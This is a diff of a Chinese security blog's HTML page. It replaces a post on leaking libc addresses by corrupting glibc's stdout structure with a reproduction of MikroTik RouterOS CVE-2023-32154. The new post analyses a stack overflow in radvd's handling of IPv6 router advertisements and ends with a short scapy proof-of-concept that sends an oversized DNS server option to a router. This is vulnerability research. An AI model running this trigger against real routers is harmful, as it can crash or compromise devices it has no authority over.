@@ -95,7 +95,7 @@
 
 
 
-  <meta name="keywords" content="堆,IO_FILE,leak,tcache,">
+  <meta name="keywords" content="Hexo, NexT">
 
 
 
@@ -108,18 +108,18 @@
 
 
 
-<meta name="description" content="上次比赛出了个house of roman思路的题，结果发现这个利用方式已经落后于时代了,当大家纷纷把这题秒了的时候，我顿时对自己产生了怀疑。所以记录一下。。。。 其实主要思路就是修改stdout的flag位为0xfbad1800,并且将_IO_write_base的最后一个字节改小，从而实现多输出一些内容，这些内容里面就包含了libc地址。">
-<meta name="keywords" content="堆,IO_FILE,leak,tcache">
+<meta name="description" content="pwn2own上orange团队利用的漏洞，认证前rce。但是经过我自己的实验发现是非默认配置，且前置条件比较多。">
+<meta name="keywords" content="pwn,AI">
 <meta property="og:type" content="article">
-<meta property="og:title" content="IO_FILE leak">
-<meta property="og:url" content="wood1314.github.io/year/03/15/cloi1ku9e000xzs3f84i382c5/index.html">
+<meta property="og:title" content="routeros CVE-2023-32154 复现">
+<meta property="og:url" content="wood1314.github.io/year/08/29/clv60a9oi0000ap3fw38uc2mg/index.html">
 <meta property="og:site_name" content="木头的小木屋">
-<meta property="og:description" content="上次比赛出了个house of roman思路的题，结果发现这个利用方式已经落后于时代了,当大家纷纷把这题秒了的时候，我顿时对自己产生了怀疑。所以记录一下。。。。 其实主要思路就是修改stdout的flag位为0xfbad1800,并且将_IO_write_base的最后一个字节改小，从而实现多输出一些内容，这些内容里面就包含了libc地址。">
+<meta property="og:description" content="pwn2own上orange团队利用的漏洞，认证前rce。但是经过我自己的实验发现是非默认配置，且前置条件比较多。">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2020-03-15T13:24:13.632Z">
+<meta property="og:updated_time" content="2024-04-09T07:29:34.658Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="IO_FILE leak">
-<meta name="twitter:description" content="上次比赛出了个house of roman思路的题，结果发现这个利用方式已经落后于时代了,当大家纷纷把这题秒了的时候，我顿时对自己产生了怀疑。所以记录一下。。。。 其实主要思路就是修改stdout的flag位为0xfbad1800,并且将_IO_write_base的最后一个字节改小，从而实现多输出一些内容，这些内容里面就包含了libc地址。">
+<meta name="twitter:title" content="routeros CVE-2023-32154 复现">
+<meta name="twitter:description" content="pwn2own上orange团队利用的漏洞，认证前rce。但是经过我自己的实验发现是非默认配置，且前置条件比较多。">
 
 
 
@@ -149,13 +149,13 @@
 
 
 
-  <link rel="canonical" href="wood1314.github.io/year/03/15/cloi1ku9e000xzs3f84i382c5/">
+  <link rel="canonical" href="wood1314.github.io/year/08/29/clv60a9oi0000ap3fw38uc2mg/">
 
 
 
 
 
-  <title>IO_FILE leak | 木头的小木屋</title>
+  <title>routeros CVE-2023-32154 复现 | 木头的小木屋</title>
   
 
 
@@ -334,7 +334,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="wood1314.github.io/year/03/15/cloi1ku9e000xzs3f84i382c5/">
+    <link itemprop="mainEntityOfPage" href="wood1314.github.io/year/08/29/clv60a9oi0000ap3fw38uc2mg/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Wood">
@@ -351,7 +351,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">IO_FILE leak</h1>
+          <h1 class="post-title" itemprop="name headline">routeros CVE-2023-32154 复现</h1>
         
 
         <div class="post-meta">
@@ -363,8 +363,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-03-15T21:05:23+08:00">
-                2020-03-15
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2023-08-29T11:34:10+08:00">
+                2023-08-29
               </time>
             
 
@@ -406,25 +406,32 @@
       
 
       
-        <p>上次比赛出了个<code>house of roman</code>思路的题，结果发现这个利用方式已经落后于时代了,当大家纷纷把这题秒了的时候，我顿时对自己产生了怀疑。所以记录一下。。。。</p>
-<p>其实主要思路就是修改<code>stdout</code>的<code>flag</code>位为<code>0xfbad1800</code>,并且将<code>_IO_write_base</code>的最后一个字节改小，从而实现多输出一些内容，这些内容里面就包含了libc地址。</p>
+        <p>pwn2own上orange团队利用的漏洞，认证前rce。但是经过我自己的实验发现是非默认配置，且前置条件比较多。</p>
 <a id="more"></a>
-<h2 id="stdout泄露"><a href="#stdout泄露" class="headerlink" title="stdout泄露"></a>stdout泄露</h2><p>为什么<code>flag</code>要改成0xfbad1800，看源码：</p>
-<p><code>puts</code>函数在源码中是由<code>_IO_puts</code>实现的，而<code>_IO_puts</code>函数内部会调用<code>_IO_sputn</code>，结果会执行<code>_IO_new_file_xsputn</code>，最终会执行<code>_IO_overflow</code></p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> </span><br><span class="line">_IO_new_file_overflow (_IO_FILE *f, <span class="keyword">int</span> ch) </span><br><span class="line">&#123;  </span><br><span class="line">    <span class="keyword">if</span> (f-&gt;_flags &amp; _IO_NO_WRITES) <span class="comment">/* SET ERROR */</span>    </span><br><span class="line">    &#123;<span class="comment">//避免进入      </span></span><br><span class="line">     	f-&gt;_flags |= _IO_ERR_SEEN;      </span><br><span class="line">     	__set_errno (EBADF);      </span><br><span class="line">     	<span class="keyword">return</span> EOF;    </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="comment">/* If currently reading or no buffer allocated. */</span>  </span><br><span class="line">    <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == <span class="number">0</span> || f-&gt;_IO_write_base == <span class="literal">NULL</span>)&#123; </span><br><span class="line">    	......<span class="comment">//避免进入    </span></span><br><span class="line">    	......    </span><br><span class="line">		&#125;  </span><br><span class="line">	<span class="keyword">if</span> (ch == EOF)    </span><br><span class="line">    	<span class="keyword">return</span> _IO_do_write (f, f-&gt;_IO_write_base, </span><br><span class="line">                             f-&gt;_IO_write_ptr - f-&gt;_IO_write_base); <span class="comment">//进入目标  </span></span><br><span class="line">    <span class="keyword">if</span> (f-&gt;_IO_write_ptr == f-&gt;_IO_buf_end ) <span class="comment">/* Buffer is really full */</span>    </span><br><span class="line">    	<span class="keyword">if</span> (_IO_do_flush (f) == EOF)      </span><br><span class="line">        	<span class="keyword">return</span> EOF;  </span><br><span class="line">     *f-&gt;_IO_write_ptr++ = ch;  </span><br><span class="line">     <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_UNBUFFERED)      </span><br><span class="line">         || ((f-&gt;_flags &amp; _IO_LINE_BUF) &amp;&amp; ch == <span class="string">'\n'</span>))    </span><br><span class="line">        <span class="keyword">if</span> (_IO_do_write (f, f-&gt;_IO_write_base,             </span><br><span class="line">                          f-&gt;_IO_write_ptr - f-&gt;_IO_write_base) == EOF) </span><br><span class="line">        	<span class="keyword">return</span> EOF;  </span><br><span class="line">      <span class="keyword">return</span> (<span class="keyword">unsigned</span> <span class="keyword">char</span>) ch; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<p>可以看到<code>_IO_do_write</code>是最后调用的函数，而<code>_IO_write_base</code>是我们要修改的目标。</p>
-<p>这里<code>f-&gt;_flag &amp; _IO_NO_WRITES</code>的值应该为0，为了不进入第一个if分支</p>
-<p>同时使<code>f-&gt;_flag &amp;_IO_CURRENTLY_PUTTING</code>的值为1，为了不进入第二个if分支</p>
-<p><code>_IO_do_write</code>函数的参数为：stdout结构体、<code>_IO_write_base</code>和<code>size</code>(由<code>f-&gt;_IO_write_ptr - f-&gt;_IO_write_base</code>决定)，而<code>_IO_do_write</code>实际会调用<code>new_do_write</code>，参数一样。</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span></span><br><span class="line">_IO_size_t</span><br><span class="line">new_do_write (_IO_FILE *fp, <span class="keyword">const</span> <span class="keyword">char</span> *data, _IO_size_t to_do)</span><br><span class="line">&#123;</span><br><span class="line">  ...</span><br><span class="line">  _IO_size_t count;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_IS_APPENDING)</span><br><span class="line">    fp-&gt;_offset = _IO_pos_BAD;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (fp-&gt;_IO_read_end != fp-&gt;_IO_write_base)</span><br><span class="line">    &#123;</span><br><span class="line">      _IO_off64_t new_pos</span><br><span class="line">    = _IO_SYSSEEK (fp, fp-&gt;_IO_write_base - fp-&gt;_IO_read_end, <span class="number">1</span>);</span><br><span class="line">      <span class="keyword">if</span> (new_pos == _IO_pos_BAD)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      fp-&gt;_offset = new_pos;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="comment">// 调用函数输出输出缓冲区</span></span><br><span class="line">  count = _IO_SYSWRITE (fp, data, to_do); <span class="comment">//最终输出 </span></span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> count;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="0x00-CVE信息"><a href="#0x00-CVE信息" class="headerlink" title="0x00 CVE信息"></a>0x00 CVE信息</h2><p><strong>What this issue affects:</strong> The issue affects devices running MikroTik RouterOS versions v6.xx and v7.xx with enabled IPv6 advertisement receiver functionality. <strong>You are only affected if</strong> one of the below settings is applied:</p>
+<p>通过官方描述，得知漏洞存在于ipv6的RA协议中。</p>
+<p>Router Advertisement（RA）是IPv6协议中的一种控制消息，用于告知网络中其他设备关于路由器的存在和IPv6地址分配信息。RA消息通常由网络中的路由器定期广播，以便其他设备可以获取路由器的信息并使用IPv6协议与其通信。</p>
+<p>在RouterOS中，RA功能是路由器的一个基本功能，它可以通过配置路由器的接口参数来启用。当启用RA功能后，路由器将会在指定的接口上定期广播RA消息，使得其他IPv6设备可以通过接收这些消息来自动配置自己的IPv6地址和路由信息。</p>
+<h2 id="0x01-漏洞分析"><a href="#0x01-漏洞分析" class="headerlink" title="0x01 漏洞分析"></a>0x01 漏洞分析</h2><p>找到负责RA协议处理的二进制，radvd进行bindiff，发现新版本的patch主要在下面这段代码</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> ( v21 != a2 + <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v9 = sub_804E434(v8);</span><br><span class="line">    <span class="keyword">if</span> ( (_BYTE)v9 )</span><br><span class="line">    &#123;</span><br><span class="line">      v10 = <span class="keyword">operator</span>&lt;&lt;(&amp;unk_80554C0, <span class="string">"adding DNS server option, address="</span>, v9, v9);</span><br><span class="line">      v11 = <span class="keyword">operator</span>&lt;&lt;(v16, v21 + <span class="number">3</span>, v10, v21 + <span class="number">3</span>);</span><br><span class="line">      v12 = <span class="keyword">operator</span>&lt;&lt;(v11, v20, v17, v18);</span><br><span class="line">      <span class="built_in">endl</span>(v12);</span><br><span class="line">    &#125;</span><br><span class="line">    v19 = v21[<span class="number">4</span>];</span><br><span class="line">    v13 = v21[<span class="number">5</span>];</span><br><span class="line">    v14 = v21[<span class="number">6</span>];</span><br><span class="line">    *(_DWORD *)(a1 + v3) = v21[<span class="number">3</span>];</span><br><span class="line">    *(_DWORD *)(a1 + v3 + <span class="number">12</span>) = v14;</span><br><span class="line">    *(_DWORD *)(a1 + v3 + <span class="number">4</span>) = v19;</span><br><span class="line">    *(_DWORD *)(a1 + v3 + <span class="number">8</span>) = v13;</span><br><span class="line">    v3 += <span class="number">16</span>;</span><br><span class="line">    tree_iterator_base::incr((tree_iterator_base *)&amp;v21);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
 
-<p>这里，<code>_IO_SYSWRITE</code>就是我们的目标，这相当于<code>write(fp,data,to_do)</code>。</p>
-<p><code>_IO_SYSSEEK</code>只是简单的调用<code>lseek</code>，但是我们不能完全控制<code>fp-&gt;_IO_write_base - fp-&gt;_IO_read_end</code>的值，如果fp-&gt;_IO_read_end的值设置为0，那么<code>_IO_SYSSEEK</code>的第二个参数值就会过大，如果设置<code>fp-&gt;_IO_write_base = fp-&gt;_IO_read_end</code>的话，那么在其它地方就会有问题，因为<code>fp-&gt;_IO_write_base</code> 不能大于 <code>fp-&gt;_IO_write_end</code>。所以这里要设置<code>fp-&gt;_flags | _IO_IS_APPENDING</code>，避免进入else if 分支。</p>
-<p>最终需要构造的fp-flags是这样的，才能绕过上面提到的分支。</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">_flags = <span class="number">0xfbad0000</span> </span><br><span class="line">_flags &amp;= ~_IO_NO_WRITES ## _flags = <span class="number">0xfbad0000</span> </span><br><span class="line">_flags |= _IO_CURRENTLY_PUTTING ## _flags = <span class="number">0xfbad0800</span></span><br><span class="line">_flags |= _IO_IS_APPENDING ## _flags = <span class="number">0xfbad1800</span></span><br></pre></td></tr></table></figure>
+<p>可以看到这段逻辑循环终止条件是v21这个vector到末尾，并且在循环过程中会把vector中的内容向a1上拷贝。其实再向上追一下可以发现a1是上层函数中的一个栈上的变量且大小是固定的。因此只要这个vector中的内容足够大便可以造成栈溢出。</p>
+<p>在后续版本中，这部分逻辑检测了vecotr上的总容量要小于栈上的大小，后续又将栈上的变量直接改为了动态分配的vector，永绝后患。</p>
+<p>在上层函数中，a1变量对应v126，可见这段代码整体逻辑就是把vecotr上的DNS server option拷贝到栈上组成一个包，然后发送出去。其他的关于RA的配置信息也是如此构造。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">message.msg_name = v129;</span><br><span class="line">      message.msg_iov = (struct iovec *)v126;</span><br><span class="line">      message.msg_flags = <span class="number">0</span>;</span><br><span class="line">      message.msg_namelen = <span class="number">28</span>;</span><br><span class="line">      message.msg_iovlen = <span class="number">1</span>;</span><br><span class="line">      message.msg_control = v130;</span><br><span class="line">      message.msg_controllen = <span class="number">32</span>;</span><br><span class="line">      result = sendmsg(fd, &amp;message, <span class="number">0</span>);</span><br></pre></td></tr></table></figure>
 
-<p>所以通常将stdout的flags修改成0xfbad1800，将_IO_write_base改小，就可以造成libc的泄漏。</p>
+<p>根据对ipv6协议的学习，我们可以通过先向Mikrotik发送通过发送路由器通告RA（Router Advertisement）报文去把DNS server option这个vector设置的很大。然后再路由器请求RS（Router Solicitation）报文）来让Mikrotik把自身的配置通告给邻居设备来触发这段逻辑的执行。</p>
+<h2 id="0x-02-漏洞触发"><a href="#0x-02-漏洞触发" class="headerlink" title="0x 02 漏洞触发"></a>0x 02 漏洞触发</h2><p>首先需要设置路由器可以接收RA报文，默认其实是不接受的</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ipv6/settings/ set accept-router-advertisements=yes</span><br></pre></td></tr></table></figure>
+
+<p>查找RFC构造NS和NA报文来触发漏洞，这里我选择scapy，scapy在文档中均有对RA和RS报文的实现。我们对RS报文原封不动，修改RA报文的extion部分的DNS server option即可</p>
+<p>根据rfc6106，DNS server option格式如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"> 0                   1                   2                   3</span><br><span class="line"> 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1</span><br><span class="line">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">|     Type      |     Length    |           Reserved            |</span><br><span class="line">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">|                           Lifetime                            |</span><br><span class="line">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">|                                                               |</span><br><span class="line">:            Addresses of IPv6 Recursive DNS Servers            :</span><br><span class="line">|                                                               |</span><br><span class="line">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x03-poc"><a href="#0x03-poc" class="headerlink" title="0x03 poc"></a>0x03 poc</h2><p>最终构造poc如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> scapy.all <span class="keyword">import</span> *</span><br><span class="line">target_addr = <span class="string">"fe80::20c:29ff:fe03:f73"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyICMPv6NDOptRDNSS</span><span class="params">(Packet)</span>:</span></span><br><span class="line">    name = <span class="string">"ICMPv6 Neighbor Discovery Option - Recursive DNS Server Option"</span></span><br><span class="line">    fields_desc = [ByteField(<span class="string">"type"</span>, <span class="number">25</span>),</span><br><span class="line">                   ByteField(<span class="string">"len"</span>, <span class="number">17</span>),</span><br><span class="line">                   ShortField(<span class="string">"res"</span>, <span class="literal">None</span>),</span><br><span class="line">                   IntField(<span class="string">"lifetime"</span>, <span class="number">0xffffffff</span>),</span><br><span class="line">                   StrField(</span><br><span class="line">                       <span class="string">"dns"</span>, <span class="string">"AAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBCCCCCCCCCCCCCCCCAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBCCCCCCCCCCCCCCCCBBBBBBBBBBBBBBBBCCCCCCCCCCCCCCCC"</span>)</span><br><span class="line">                   ]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造 RA 消息</span></span><br><span class="line">ra = IPv6(dst=target_addr) / \</span><br><span class="line">    ICMPv6ND_RA()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pkt = ra / \</span><br><span class="line">    MyICMPv6NDOptRDNSS()</span><br><span class="line"><span class="comment"># 发送 RA 消息</span></span><br><span class="line">send(pkt)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 发送RS消息</span></span><br><span class="line">rs = IPv6(dst=target_addr) / ICMPv6ND_RS()</span><br><span class="line">send(rs)</span><br></pre></td></tr></table></figure>
+
 
       
     </div>
@@ -451,18 +458,6 @@
 
     <footer class="post-footer">
       
-        <div class="post-tags">
-          
-            <a href="/tags/堆/" rel="tag"><i class="fa fa-tag"></i> 堆</a>
-          
-            <a href="/tags/IO-FILE/" rel="tag"><i class="fa fa-tag"></i> IO_FILE</a>
-          
-            <a href="/tags/leak/" rel="tag"><i class="fa fa-tag"></i> leak</a>
-          
-            <a href="/tags/tcache/" rel="tag"><i class="fa fa-tag"></i> tcache</a>
-          
-        </div>
-      
 
       
       
@@ -472,8 +467,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/year/03/14/cloi1kubp0068zs3fniyasflf/" rel="next" title="算法设计与分析">
-                <i class="fa fa-chevron-left"></i> 算法设计与分析
+              <a href="/year/04/25/cloi1kuad002ezs3f30qjbl35/" rel="next" title="chroot jailbreak 源码分析">
+                <i class="fa fa-chevron-left"></i> chroot jailbreak 源码分析
               </a>
             
           </div>
@@ -481,10 +476,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/year/03/22/cloi1ku8u0008zs3f0pot39j0/" rel="prev" title="BJDCTF-writeup">
-                BJDCTF-writeup <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -650,7 +641,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#stdout泄露"><span class="nav-number">1.</span> <span class="nav-text">stdout泄露</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x00-CVE信息"><span class="nav-number">1.</span> <span class="nav-text">0x00 CVE信息</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-漏洞分析"><span class="nav-number">2.</span> <span class="nav-text">0x01 漏洞分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x-02-漏洞触发"><span class="nav-number">3.</span> <span class="nav-text">0x 02 漏洞触发</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-poc"><span class="nav-number">4.</span> <span class="nav-text">0x03 poc</span></a></li></ol></div>
             
 
           </div>
